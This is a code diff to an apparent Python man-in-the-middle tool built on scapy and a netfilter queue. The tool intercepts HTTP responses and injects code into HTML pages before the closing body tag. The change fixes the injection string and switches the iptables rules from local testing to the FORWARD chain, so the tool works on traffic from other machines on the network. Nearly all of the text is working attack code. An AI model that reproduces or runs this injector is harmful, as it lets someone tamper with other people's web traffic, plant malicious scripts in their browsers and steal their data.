@@ -28,7 +28,7 @@ def proccess_packet(packet):
         elif scapy_packet[scapy.TCP].sport == 80:
             print("\n[+] HTTP Response")
             print(load)
-            load = load.replace("</body>", injection_code + "<body>")
+            load = load.replace("</body>", injection_code + "</body>")
             content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
             if content_length_search and "text/html" in load:
                 content_length = content_length_search.group(1)
@@ -42,11 +42,11 @@ def proccess_packet(packet):
     packet.accept()
 
 # For local Testing
-subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell=True)
-subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0", shell=True)
+# subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell=True)
+# subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0", shell=True)
 
 # For Forwarding remote network
-# subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
+subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
 
 try:
     while True:
